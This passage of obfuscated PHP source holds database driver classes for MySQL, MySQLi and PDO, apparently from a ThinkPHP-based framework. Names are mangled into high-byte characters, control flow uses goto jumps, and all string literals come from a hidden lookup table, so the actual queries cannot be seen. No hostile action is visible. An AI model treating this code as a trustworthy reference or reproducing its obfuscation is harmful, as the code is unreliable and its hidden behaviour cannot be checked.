mysql_pconnect($F¬ÌÄÜ©ˆ„, $fÂÖ¼õº÷æ[$e‘Ïò°’„É[566]], $fÂÖ¼õº÷æ[$e‘Ïò°’„É[567]], 131072); } else { $this->linkID[$fŸˆŸéÑÜê] = mysql_connect($F¬ÌÄÜ©ˆ„, $fÂÖ¼õº÷æ[$e‘Ïò°’„É[566]], $fÂÖ¼õº÷æ[$e‘Ïò°’„É[567]], !0, 131072); } if (!$this->linkID[$fŸˆŸéÑÜê] || !empty($fÂÖ¼õº÷æ[$e‘Ïò°’„É[17]]) && !mysql_select_db($fÂÖ¼õº÷æ[$e‘Ïò°’„É[17]], $this->linkID[$fŸˆŸéÑÜê])) { think_exception(mysql_error()); } $BößÎÈ‡Àè = mysql_get_server_info($this->linkID[$fŸˆŸéÑÜê]); goto c‰¬ÕÜœÔÅ; f·Åß§¾Áš: if (1 != think_config($e‘Ïò°’„É[18])) { unset($this->config); } goto E·™ÏùšÄË; E·™ÏùšÄË: } return $this->linkID[$fŸˆŸéÑÜê]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Dì‘‘Ÿæ¥Ë) { goto b‚Ø¡îĞ‡; b‚Ø¡îĞ‡: $B¬í£Ë¦Â÷ =& $_SERVER[İåâé¾]; if (0 === stripos($Dì‘‘Ÿæ¥Ë, $B¬í£Ë¦Â÷[255])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto fÃé’ï¹Œ; eñà›Âø‚ß: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto d´Ñäíƒß”; fÃé’ï¹Œ: if (!$this->_linkID) { return !1; } $this->queryStr = $Dì‘‘Ÿæ¥Ë; if ($this->queryID) { $this->free(); } goto c‘İãííÖ; c‘İãííÖ: think_action_status($B¬í£Ë¦Â÷[19], 1); think_status($B¬í£Ë¦Â÷[20]); $this->queryID = mysql_query($Dì‘‘Ÿæ¥Ë, $this->_linkID); goto eñà›Âø‚ß; d´Ñäíƒß”: } public function execute($B’²‰Àä–‘) { goto FˆÌ»ÑµÕß; bŸ•Ş‚«˜: $this->queryStr = $B’²‰Àä–‘; if ($this->queryID) { $this->free(); } think_action_status($EĞ‹˜ßÁ‡´[21], 1); goto CøóÛ °Ù; bŒºæ¾ãéÅ: if (!1 === $CŠ…Ã×½öÖ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto dİ™×¨íĞ; FˆÌ»ÑµÕß: $EĞ‹˜ßÁ‡´ =& $_SERVER[İåâé¾]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto bŸ•Ş‚«˜; CøóÛ °Ù: think_status($EĞ‹˜ßÁ‡´[20]); $CŠ…Ã×½öÖ = mysql_query($B’²‰Àä–‘, $this->_linkID); $this->debug(); goto bŒºæ¾ãéÅ; dİ™×¨íĞ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[İåâé¾][572], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $d¨˜°õë = mysql_query($_SERVER[İåâé¾][573], $this->_linkID); $this->transTimes = 0; if (!$d¨˜°õë) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $d×Åøæóé™ = mysql_query($_SERVER[İåâé¾][574], $this->_linkID); $this->transTimes = 0; if (!$d×Åøæóé™) { $this->error(); return !1; } } return !0; } private function getAll() { $A Î–êÖŒ— = array(); if ($this->numRows > 0) { while ($CŒÜÃ©°­‰ = mysql_fetch_assoc($this->queryID)) { $A Î–êÖŒ—[] = $CŒÜÃ©°­‰; } mysql_data_seek($this->queryID, 0); } return $A Î–êÖŒ—; } public function getFields($B‰‹ŠËØÍâ) { $EŠ¦¬î¯¢ã =& $_SERVER[İåâé¾]; $F’‰èã¢Ğ¨ = $this->query($EŠ¦¬î¯¢ã[575] . $this->parseKey($B‰‹ŠËØÍâ)); $FˆºŞº´ƒ = array(); if ($F’‰èã¢Ğ¨) { foreach ($F’‰èã¢Ğ¨ as $D¡«±Ãù => $D‡æÊ•ŠÈ‹) { $FˆºŞº´ƒ[$D‡æÊ•ŠÈ‹[$EŠ¦¬î¯¢ã[27]]] = array($EŠ¦¬î¯¢ã[28] => $D‡æÊ•ŠÈ‹[$EŠ¦¬î¯¢ã[27]], $EŠ¦¬î¯¢ã[29] => $D‡æÊ•ŠÈ‹[$EŠ¦¬î¯¢ã[30]], $EŠ¦¬î¯¢ã[31] => (bool) (strtoupper($D‡æÊ•ŠÈ‹[$EŠ¦¬î¯¢ã[32]]) === $EŠ¦¬î¯¢ã[576]), $EŠ¦¬î¯¢ã[34] => $D‡æÊ•ŠÈ‹[$EŠ¦¬î¯¢ã[35]], $EŠ¦¬î¯¢ã[36] => strtolower($D‡æÊ•ŠÈ‹[$EŠ¦¬î¯¢ã[37]]) == $EŠ¦¬î¯¢ã[38], $EŠ¦¬î¯¢ã[39] => strtolower($D‡æÊ•ŠÈ‹[$EŠ¦¬î¯¢ã[40]]) == $EŠ¦¬î¯¢ã[41]); } } return $FˆºŞº´ƒ; } public function getTables($DŠ‚åŒùŞ® = '') { $CÔÖÕñêŒ =& $_SERVER[İåâé¾]; if (!empty($DŠ‚åŒùŞ®)) { $aõ§Ø»÷´¨ = $CÔÖÕñêŒ[577] . $DŠ‚åŒùŞ®; } else { $aõ§Ø»÷´¨ = $CÔÖÕñêŒ[578]; } $DÃàŠ¼ë = $this->query($aõ§Ø»÷´¨); $dÌøÅ÷§Ã = array(); foreach ($DÃàŠ¼ë as $DÓé‘ğéó => $Fò¹£˜…ù) { $dÌøÅ÷§Ã[$DÓé‘ğéó] = current($Fò¹£˜…ù); } return $dÌøÅ÷§Ã; } public function replace($F²âùÅïÇµ, $cêš¼Àâß = array()) { $f‹äØÚŠé =& $_SERVER[İåâé¾]; foreach ($F²âùÅïÇµ as $D´áÒ‰Ìƒ… => $eµ±¢¬Œß•) { $dÜÏä¸Ñëß = $this->parseValue($eµ±¢¬Œß•); if (is_scalar($dÜÏä¸Ñëß)) { $BáÄˆİŞ‰[] = $dÜÏä¸Ñëß; $a‰‡‡Ä„Æ[] = $this->parseKey($D´áÒ‰Ìƒ…); } } $FŒ£à¹Óİ´ = $f‹äØÚŠé[579] . $this->parseTable($cêš¼Àâß[$f‹äØÚŠé[270]]) . $f‹äØÚŠé[580] . implode($f‹äØÚŠé[47], $a‰‡‡Ä„Æ) . $f‹äØÚŠé[581] . implode($f‹äØÚŠé[47], $BáÄˆİŞ‰) . $f‹äØÚŠé[582]; return $this->execute($FŒ£à¹Óİ´); } public function insertAll($c‡®“ìÚ¤, $e¨ÆŞÂçï = array(), $aöÃ«¸¯£ƒ = false) { goto A½ŠÊì¢ë; A½ŠÊì¢ë: $aÖÉÊ –İÖ =& $_SERVER[İåâé¾]; if (!is_array($c‡®“ìÚ¤[0])) { return !1; } $C‰–êÎ«Ø… = array_keys($c‡®“ìÚ¤[0]); goto bë÷ŒñÌß; eªÑä’·øÂ: $FĞôë«ç‹¼ = ($aöÃ«¸¯£ƒ ? $aÖÉÊ –İÖ[584] : $aÖÉÊ –İÖ[585]) . $aÖÉÊ –İÖ[586] . $this->parseTable($e¨ÆŞÂçï[$aÖÉÊ –İÖ[270]]) . $aÖÉÊ –İÖ[580] . implode($aÖÉÊ –İÖ[47], $C‰–êÎ«Ø…) . $aÖÉÊ –İÖ[587] . implode($aÖÉÊ –İÖ[47], $bä§¡…§Ï‹); return $this->execute($FĞôë«ç‹¼); goto bÛî÷•Êù; bë÷ŒñÌß: $bä§¡…§Ï‹ = array(); foreach ($c‡®“ìÚ¤ as $f†”¤éÏÅÅ) { $dÖŠøí¤¯¬ = array(); foreach ($f†”¤éÏÅÅ as $c’˜³«®­– => $D‘–ĞÂŠî³) { $D‘–ĞÂŠî³ = $this->parseValue($D‘–ĞÂŠî³); if (is_scalar($D‘–ĞÂŠî³)) { $dÖŠøí¤¯¬[] = $D‘–ĞÂŠî³; } } $bä§¡…§Ï‹[] = $aÖÉÊ –İÖ[251] . implode($aÖÉÊ –İÖ[47], $dÖŠøí¤¯¬) . $aÖÉÊ –İÖ[582]; } array_walk($C‰–êÎ«Ø…, array($this, $aÖÉÊ –İÖ[583])); goto eªÑä’·øÂ; bÛî÷•Êù: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $fÃ…©Ò‘Ô =& $_SERVER[İåâé¾]; $this->error = mysql_errno() . $fÃ…©Ò‘Ô[4] . mysql_error($this->_linkID); if ($fÃ…©Ò‘Ô[33] != $this->queryStr) { $this->error .= LNG($fÃ…©Ò‘Ô[45]) . $this->queryStr; } think_trace($this->error, $fÃ…©Ò‘Ô[33], $fÃ…©Ò‘Ô[46]); return $this->error; } public function escapeString($E…ƒ”Åç·¢) { if ($this->_linkID) { return mysql_real_escape_string($E…ƒ”Åç·¢, $this->_linkID); } else { return mysql_escape_string($E…ƒ”Åç·¢); } } public function parseKey(&$C‚ìŸĞÉÁ, $cÌé‚‚Õí÷ = true) { $C¦è÷º—˜» =& $_SERVER[İåâé¾]; if ($cÌé‚‚Õí÷) { $C‚ìŸĞÉÁ = $this->parseKeyCheck($C‚ìŸĞÉÁ); } if ($C‚ìŸĞÉÁ != $C¦è÷º—˜»[172] && !preg_match($C¦è÷º—˜»[588], $C‚ìŸĞÉÁ)) { $C‚ìŸĞÉÁ = $C¦è÷º—˜»[589] . trim($C‚ìŸĞÉÁ, $C¦è÷º—˜»[589]) . $C¦è÷º—˜»[589]; } return $C‚ìŸĞÉÁ; } } class DbMysqli extends Db { public function __construct($E¦‹š‹¯¶‰ = '') { $Eœ„·¥ÂÔĞ =& $_SERVER[İåâé¾]; if (!extension_loaded($Eœ„·¥ÂÔĞ[590])) { think_exception(think_lang($Eœ„·¥ÂÔĞ[10]) . $Eœ„·¥ÂÔĞ[591]); } if (!empty($E¦‹š‹¯¶‰)) { $this->config = $E¦‹š‹¯¶‰; if (empty($this->config[$Eœ„·¥ÂÔĞ[13]])) { $this->config[$Eœ„·¥ÂÔĞ[13]] = $Eœ„·¥ÂÔĞ[33]; } } } public function connect($bßÂ‰‹Ø³‰ = '', $c‹ˆóÎ¼İ = 0) { $Aœ¬Ö¹«Ÿô =& $_SERVER[İåâé¾]; if (!isset($this->linkID[$c‹ˆóÎ¼İ])) { goto B¥¬‹í»„“; d“ Şï†áÜ: $AÕİÆ™İ = $this->linkID[$c‹ˆóÎ¼İ]->server_version; $this->linkID[$c‹ˆóÎ¼İ]->query($Aœ¬Ö¹«Ÿô[568] . think_config($Aœ¬Ö¹«Ÿô[569]) . $Aœ¬Ö¹«Ÿô[55]); if ($AÕİÆ™İ > $Aœ¬Ö¹«Ÿô[570]) { $this->linkID[$c‹ˆóÎ¼İ]->query($Aœ¬Ö¹«Ÿô[571]); } goto bÆÃ‘È£; bÆÃ‘È£: $this->connected = !0; if (1 != think_config($Aœ¬Ö¹«Ÿô[18])) { unset($this->config); } goto AñÍÛ©Æ­Ğ; B¥¬‹í»„“: if (empty($bßÂ‰‹Ø³‰)) { $bßÂ‰‹Ø³‰ = $this->config; } $this->linkID[$c‹ˆóÎ¼İ] = new mysqli($bßÂ‰‹Ø³‰[$Aœ¬Ö¹«Ÿô[564]], $bßÂ‰‹Ø³‰[$Aœ¬Ö¹«Ÿô[566]], $bßÂ‰‹Ø³‰[$Aœ¬Ö¹«Ÿô[567]], $bßÂ‰‹Ø³‰[$Aœ¬Ö¹«Ÿô[17]], $bßÂ‰‹Ø³‰[$Aœ¬Ö¹«Ÿô[565]] ? intval($bßÂ‰‹Ø³‰[$Aœ¬Ö¹«Ÿô[565]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto d“ Şï†áÜ; AñÍÛ©Æ­Ğ: } return $this->linkID[$c‹ˆóÎ¼İ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($E©˜Ó¦¬ÎÎ) { goto E†²¡‘çÎ“; E†²¡‘çÎ“: $C…Æé—„Éí =& $_SERVER[İåâé¾]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto A¸‚ø’ŸïÍ; dÏØ¢Í¾¨†: think_status($C…Æé—„Éí[20]); $this->queryID = $this->_linkID->query($E©˜Ó¦¬ÎÎ); if ($this->_linkID->more_results()) { while (($EóïÙ´´§ë = $this->_linkID->next_result()) != NULL) { $EóïÙ´´§ë->free_result(); } } goto a»‚Ô³·©ô; A¸‚ø’ŸïÍ: $this->queryStr = $E©˜Ó¦¬ÎÎ; if ($this->queryID) { $this->free(); } think_action_status($C…Æé—„Éí[19], 1); goto dÏØ¢Í¾¨†; a»‚Ô³·©ô: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto f–ÇÑ“…‚; f–ÇÑ“…‚: } public function execute($FÚÒí¥¡â¢) { goto b£¢îö¨ğó; b£¢îö¨ğó: $b»‡ùç©Ã„ =& $_SERVER[İåâé¾]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto B¥„Á”Ë; B¥„Á”Ë: $this->queryStr = $FÚÒí¥¡â¢; if ($this->queryID) { $this->free(); } think_action_status($b»‡ùç©Ã„[21], 1); goto FÅ…ÇîÛÓ; FÅ…ÇîÛÓ: think_status($b»‡ùç©Ã„[20]); $DÒ“£åÍ‘ô = $this->_linkID->query($FÚÒí¥¡â¢); $this->debug(); goto béàõà™ ¤; béàõà™ ¤: if (!1 === $DÒ“£åÍ‘ô) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto dğ„”¹¡™‚; dğ„”¹¡™‚: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $FÇê‘‚ ‘ì = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$FÇê‘‚ ‘ì) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $fÁ¦Èê­Æ… = $this->_linkID->rollback(); $this->transTimes = 0; if (!$fÁ¦Èê­Æ…) { $this->error(); return !1; } } return !0; } private function getAll() { $d«¨ö¬ùÆö = array(); if ($this->numRows > 0) { for ($EÆÚƒ¥‚ù = 0; $EÆÚƒ¥‚ù < $this->numRows; $EÆÚƒ¥‚ù++) { $d«¨ö¬ùÆö[$EÆÚƒ¥‚ù] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $d«¨ö¬ùÆö; } public function getFields($CšÉŠä£ö) { $d·‚ÌŞğãÅ =& $_SERVER[İåâé¾]; $C÷¤İ¡ß‘ = $this->query($d·‚ÌŞğãÅ[575] . $this->parseKey($CšÉŠä£ö)); $eøÚ†š÷ğ = array(); if ($C÷¤İ¡ß‘) { foreach ($C÷¤İ¡ß‘ as $AõË‘Æ¼•¯ => $eäÚ¡õ¯Å ) { $eøÚ†š÷ğ[$eäÚ¡õ¯Å [$d·‚ÌŞğãÅ[27]]] = array($d·‚ÌŞğãÅ[28] => $eäÚ¡õ¯Å [$d·‚ÌŞğãÅ[27]], $d·‚ÌŞğãÅ[29] => $eäÚ¡õ¯Å [$d·‚ÌŞğãÅ[30]], $d·‚ÌŞğãÅ[31] => (bool) ($eäÚ¡õ¯Å [$d·‚ÌŞğãÅ[32]] === $d·‚ÌŞğãÅ[33]), $d·‚ÌŞğãÅ[34] => $eäÚ¡õ¯Å [$d·‚ÌŞğãÅ[35]], $d·‚ÌŞğãÅ[36] => strtolower($eäÚ¡õ¯Å [$d·‚ÌŞğãÅ[37]]) == $d·‚ÌŞğãÅ[38], $d·‚ÌŞğãÅ[39] => strtolower($eäÚ¡õ¯Å [$d·‚ÌŞğãÅ[40]]) == $d·‚ÌŞğãÅ[41]); } } return $eøÚ†š÷ğ; } public function getTables($fªáÛÖÆ¡î = '') { $c×Ì¤à©Æ¹ =& $_SERVER[İåâé¾]; $c­Àñïó¡› = !empty($fªáÛÖÆ¡î) ? $c×Ì¤à©Æ¹[577] . $fªáÛÖÆ¡î : $c×Ì¤à©Æ¹[578]; $dÍ£Ô¹‚–ƒ = $this->query($c­Àñïó¡›); $a’ìŒğÖÆ¢ = array(); if ($dÍ£Ô¹‚–ƒ) { foreach ($dÍ£Ô¹‚–ƒ as $D»å¢ê¨à„ => $b‰éÀ±‡ĞÒ) { $a’ìŒğÖÆ¢[$D»å¢ê¨à„] = current($b‰éÀ±‡ĞÒ); } } return $a’ìŒğÖÆ¢; } public function replace($DÇÓº÷Ö, $EÄ–Ã¶·Êí = array()) { $d¡Ë™äçš‚ =& $_SERVER[İåâé¾]; foreach ($DÇÓº÷Ö as $F‘‘„ñöÈŒ => $A®Ğ™È“Àµ) { $AŒŞ¡¹İ†ß = $this->parseValue($A®Ğ™È“Àµ); if (is_scalar($AŒŞ¡¹İ†ß)) { $E®ñ÷‡øéØ[] = $AŒŞ¡¹İ†ß; $C¿‡ÙË¿„š[] = $this->parseKey($F‘‘„ñöÈŒ); } } $Aé·¬ÌóŒ = $d¡Ë™äçš‚[579] . $this->parseTable($EÄ–Ã¶·Êí[$d¡Ë™äçš‚[270]]) . $d¡Ë™äçš‚[580] . implode($d¡Ë™äçš‚[47], $C¿‡ÙË¿„š) . $d¡Ë™äçš‚[581] . implode($d¡Ë™äçš‚[47], $E®ñ÷‡øéØ) . $d¡Ë™äçš‚[582]; return $this->execute($Aé·¬ÌóŒ); } public function insertAll($F¨Ÿõ‹„«, $c…³ÒËâ™ç = array(), $d•Ì˜­Ø… = false) { goto DÌÊÛ­¥†Ğ; DÌÊÛ­¥†Ğ: $b¼ÚªÏÎî™ =& $_SERVER[İåâé¾]; if (!is_array($F¨Ÿõ‹„«[0])) { return !1; } $EÉì³¿…Å = array_keys($F¨Ÿõ‹„«[0]); goto BòŒÌ±»ãº; a‘›šÕ¾Ø: $F¢°´œ¢— = ($d•Ì˜­Ø… ? $b¼ÚªÏÎî™[584] : $b¼ÚªÏÎî™[585]) . $b¼ÚªÏÎî™[586] . $this->parseTable($c…³ÒËâ™ç[$b¼ÚªÏÎî™[270]]) . $b¼ÚªÏÎî™[580] . implode($b¼ÚªÏÎî™[47], $EÉì³¿…Å) . $b¼ÚªÏÎî™[587] . implode($b¼ÚªÏÎî™[47], $f‚ ¨‹‘‘¼); return $this->execute($F¢°´œ¢—); goto B…Î½Š‰‚İ; BòŒÌ±»ãº: $f‚ ¨‹‘‘¼ = array(); foreach ($F¨Ÿõ‹„« as $aÛÂÊËàç’) { $Fåõ’Ó‚­÷ = array(); foreach ($aÛÂÊËàç’ as $Cä®ã«Í ­ => $B¸”‚è½«ë) { $B¸”‚è½«ë = $this->parseValue($B¸”‚è½«ë); if (is_scalar($B¸”‚è½«ë)) { $Fåõ’Ó‚­÷[] = $B¸”‚è½«ë; } } $f‚ ¨‹‘‘¼[] = $b¼ÚªÏÎî™[251] . implode($b¼ÚªÏÎî™[47], $Fåõ’Ó‚­÷) . $b¼ÚªÏÎî™[582]; } array_walk($EÉì³¿…Å, array($this, $b¼ÚªÏÎî™[583])); goto a‘›šÕ¾Ø; B…Î½Š‰‚İ: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $b‘·ÁÀ„øó =& $_SERVER[İåâé¾]; $this->error = $this->_linkID->errno . $b‘·ÁÀ„øó[4] . $this->_linkID->error; if ($b‘·ÁÀ„øó[33] != $this->queryStr) { $this->error .= LNG($b‘·ÁÀ„øó[45]) . $this->queryStr; } think_trace($this->error, $b‘·ÁÀ„øó[33], $b‘·ÁÀ„øó[46]); return $this->error; } public function escapeString($Aõ¿…„Ã«Ï) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Aõ¿…„Ã«Ï); } else { return addslashes($Aõ¿…„Ã«Ï); } } public function parseKey(&$Fºâ‡½™óÂ, $cù‹¯¹Ó°Ğ = true) { $A”ùèÃ =& $_SERVER[İåâé¾]; if ($cù‹¯¹Ó°Ğ) { $Fºâ‡½™óÂ = $this->parseKeyCheck($Fºâ‡½™óÂ); } if ($Fºâ‡½™óÂ != $A”ùèÃ[172] && !preg_match($A”ùèÃ[588], $Fºâ‡½™óÂ)) { $Fºâ‡½™óÂ = $A”ùèÃ[589] . trim($Fºâ‡½™óÂ, $A”ùèÃ[589]) . $A”ùèÃ[589]; } return $Fºâ‡½™óÂ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($DšÈŠâ‹¸ = '') { $FóˆÆ«…Û =& $_SERVER[İåâé¾]; if (!class_exists($FóˆÆ«…Û[592])) { think_exception(think_lang($FóˆÆ«…Û[10]) . $FóˆÆ«…Û[593]); } if (!empty($DšÈŠâ‹¸)) { $this->config = $DšÈŠâ‹¸; if (empty($this->config[$FóˆÆ«…Û[13]])) { $this->config[$FóˆÆ«…Û[13]] = array(); } } } public function connect($eêÂåíà‘» = '', $b´ä’¿Œä = 0) { $FÖÉ¿…½Š¼ =& $_SERVER[İåâé¾]; if (!isset($this->linkID[$b´ä’¿Œä])) { goto bä« ‡Ö÷; e°®¹«¿›: $this->linkID[$b´ä’¿Œä]->exec($FÖÉ¿…½Š¼[603] . think_config($FÖÉ¿…½Š¼[569])); $this->connected = !0; if (1 != think_config($FÖÉ¿…½Š¼[18])) { unset($this->config); } goto AÕ£–‚°ö; bä« ‡Ö÷: if (empty($eêÂåíà‘»)) { $eêÂåíà‘» = $this->config; } if ($this->pconnect) { $eêÂåíà‘»[$FÖÉ¿…½Š¼[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$b´ä’¿Œä] = new PDO($eêÂåíà‘»[$FÖÉ¿…½Š¼[594]], $eêÂåíà‘»[$FÖÉ¿…½Š¼[566]], $eêÂåíà‘»[$FÖÉ¿…½Š¼[567]], $eêÂåíà‘»[$FÖÉ¿…½Š¼[13]]); } catch (PDOException $d”Ñ‚ªƒ) { think_exception($d”Ñ‚ªƒ->getMessage()); } goto f…ªØÈ»Îª; f…ªØÈ»Îª: $this->dbType = $this->_getDsnType($eêÂåíà‘»[$FÖÉ¿…½Š¼[594]]); if (in_array($this->dbType, array($FÖÉ¿…½Š¼[595], $FÖÉ¿…½Š¼[596], $FÖÉ¿…½Š¼[597], $FÖÉ¿…½Š¼[598]))) { think_exception($FÖÉ¿…½Š¼[599] . $this->dbType . $FÖÉ¿…½Š¼[600] . $this->dbType . $FÖÉ¿…½Š¼[601]); } if (!$this->linkID[$b´ä’¿Œä]) { think_exception($FÖÉ¿…½Š¼[602]); } goto e°®¹«¿›; AÕ£–‚°ö: } return $this->linkID[$b´ä’¿Œä]; } public function free() { $this->PDOStatement = null; } public function query($E‘Åê“”, $fÏÕ¡å˜»™ = array()) { goto A ’“‹ÁÛ; aÆÖØ¯ÏÍÅ: $this->queryStr = $E‘Åê“”; if (!empty($fÏÕ¡å˜»™)) { $this->queryStr .= $FÎÌó¾Í½œ[604] . print_r($fÏÕ¡å˜»™, !0) . $FÎÌó¾Í½œ[605]; } if (!empty($this->PDOStatement)) { $this->free(); } goto AËáŸ‚ƒ¼; bÇ²ØÍ¢ëÉ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $CË·Šù = $this->PDOStatement->execute($fÏÕ¡å˜»™); $this->debug(); goto dÂ×İËÔ¹Ä; AËáŸ‚ƒ¼: think_action_status($FÎÌó¾Í½œ[19], 1); think_status($FÎÌó¾Í½œ[20]); $this->PDOStatement = $this->_linkID->prepare($E‘Åê“”); goto bÇ²ØÍ¢ëÉ; dÂ×İËÔ¹Ä: if (!1 === $CË·Šù) { $this->error(); return !1; } else { return $this->getAll(); } goto C—íÓÎ“Â³; A ’“‹ÁÛ: $FÎÌó¾Í½œ =& $_SERVER[İåâé¾]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto aÆÖØ¯ÏÍÅ; C—íÓÎ“Â³: } public function execute($A‡øÔÏİÀÂ, $C›„ô„Ôâ² = array()) { goto dÇçß³ãá; fÆ”µö ä: if ($this->dbType == $B¯À„ÄÉÚ«[598]) { if (preg_match($B¯À„ÄÉÚ«[606], $this->queryStr, $AÖ±Ü‚ê£)) { $this->table = think_config($B¯À„ÄÉÚ«[607]) . str_ireplace(think_config($B¯À„ÄÉÚ«[608]), $B¯À„ÄÉÚ«[363], $AÖ±Ü‚ê£[2]); $c§éÙöÎï = (bool) $this->query($B¯À„ÄÉÚ«[609] . strtoupper($this->table) . $B¯À„ÄÉÚ«[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($B¯À„ÄÉÚ«[21], 1); goto d‹Øç‹˜º¿; d‹Øç‹˜º¿: think_status($B¯À„ÄÉÚ«[20]); $this->PDOStatement = $this->_linkID->prepare($A‡øÔÏİÀÂ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto A†›Øí²…í; dÇçß³ãá: $B¯À„ÄÉÚ« =& $_SERVER[İåâé¾]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto d®Ç²½¤ÉÈ; A†›Øí²…í: $b—åËõ‹©¼ = $this->PDOStatement->execute($C›„ô„Ôâ²); $this->debug(); if (!1 === $b—åËõ‹©¼) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($c§éÙöÎï || preg_match($B¯À„ÄÉÚ«[610], $A‡øÔÏİÀÂ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto c„ñÇ‚İÜ; d®Ç²½¤ÉÈ: $this->queryStr = $A‡øÔÏİÀÂ; if (!empty($C›„ô„Ôâ²)) { $this->queryStr .= $B¯À„ÄÉÚ«[604] . print_r($C›„ô„Ôâ², !0) . $B¯À„ÄÉÚ«[605]; } $c§éÙöÎï = !1; goto fÆ”µö ä; c„ñÇ‚İÜ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $cË¦Šº­æÃ = $this->_linkID->commit(); $this->transTimes = 0; if (!$cË¦Šº­æÃ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $d“†²ùîø‚ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$d“†²ùîø‚) { $this->error(); return !1; } } return !0; } private function getAll() { $bœ¸Ï™ğ½ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($bœ¸Ï™ğ½); return $bœ¸Ï™ğ½; } public function getFields($aç÷„ŠÑ¨Å) { goto e è«Š´ÅÄ; e¿¥ç—áÆˆ: $bò·’öñ…• = $this->query($A…ßî²å”); $eÑƒµƒ©Ôƒ = array(); if ($bò·’öñ…•) { foreach ($bò·’öñ…• as $Dµ¥Ö¢­ƒÉ => $f¬ÀÇêŒŸã) { $f¬ÀÇêŒŸã = array_change_key_case($f¬ÀÇêŒŸã); $f¬ÀÇêŒŸã[$Fœè™ÙÌ†Û[28]] = isset($f¬ÀÇêŒŸã[$Fœè™ÙÌ†Û[28]]) ? $f¬ÀÇêŒŸã[$Fœè™ÙÌ†Û[28]] : $Fœè™ÙÌ†Û[363]; $f¬ÀÇêŒŸã[$Fœè™ÙÌ†Û[29]] = isset($f¬ÀÇêŒŸã[$Fœè™ÙÌ†Û[29]]) ? $f¬ÀÇêŒŸã[$Fœè™ÙÌ†Û[29]] : $Fœè™ÙÌ†Û[363]; $bÅÛ¯óé = isset($f¬ÀÇêŒŸã[$Fœè™ÙÌ†Û[264]]) ? $f¬ÀÇêŒŸã[$Fœè™ÙÌ†Û[264]] : $f¬ÀÇêŒŸã[$Fœè™ÙÌ†Û[28]]; $eÑƒµƒ©Ôƒ[$bÅÛ¯óé] = array($Fœè™ÙÌ†Û[28] => $bÅÛ¯óé, $Fœè™ÙÌ†Û[29] => $f¬ÀÇêŒŸã[$Fœè™ÙÌ†Û[29]], $Fœè™ÙÌ†Û[31] => (bool) (isset($f¬ÀÇêŒŸã[$Fœè™ÙÌ†Û[98]]) && $f¬ÀÇêŒŸã[$Fœè™ÙÌ†Û[98]] === $Fœè™ÙÌ†Û[33] || isset($f¬ÀÇêŒŸã[$Fœè™ÙÌ†Û[31]]) && $f¬ÀÇêŒŸã[$Fœè™ÙÌ†Û[31]] === $Fœè™ÙÌ†Û[33]), $Fœè™ÙÌ†Û[34] => isset($f¬ÀÇêŒŸã[$Fœè™ÙÌ†Û[34]]) ? $f¬ÀÇêŒŸã[$Fœè™ÙÌ†Û[34]] : (isset($f¬ÀÇêŒŸã[$Fœè™ÙÌ†Û[53]]) ? $f¬ÀÇêŒŸã[$Fœè™ÙÌ†Û[53]] : $Fœè™ÙÌ†Û[363]), $Fœè™ÙÌ†Û[36] => isset($f¬ÀÇêŒŸã[$Fœè™ÙÌ†Û[88]]) ? strtolower($f¬ÀÇêŒŸã[$Fœè™ÙÌ†Û[88]]) == $Fœè™ÙÌ†Û[38] : (isset($f¬ÀÇêŒŸã[$Fœè™ÙÌ†Û[54]]) ? $f¬ÀÇêŒŸã[$Fœè™ÙÌ†Û[54]] : !1), $Fœè™ÙÌ†Û[39] => isset($f¬ÀÇêŒŸã[$Fœè™ÙÌ†Û[627]]) ? strtolower($f¬ÀÇêŒŸã[$Fœè™ÙÌ†Û[627]]) == $Fœè™ÙÌ†Û[41] : (isset($f¬ÀÇêŒŸã[$Fœè™ÙÌ†Û[88]]) ? $f¬ÀÇêŒŸã[$Fœè™ÙÌ†Û[88]] : !1)); } } goto F“„…‡’È; 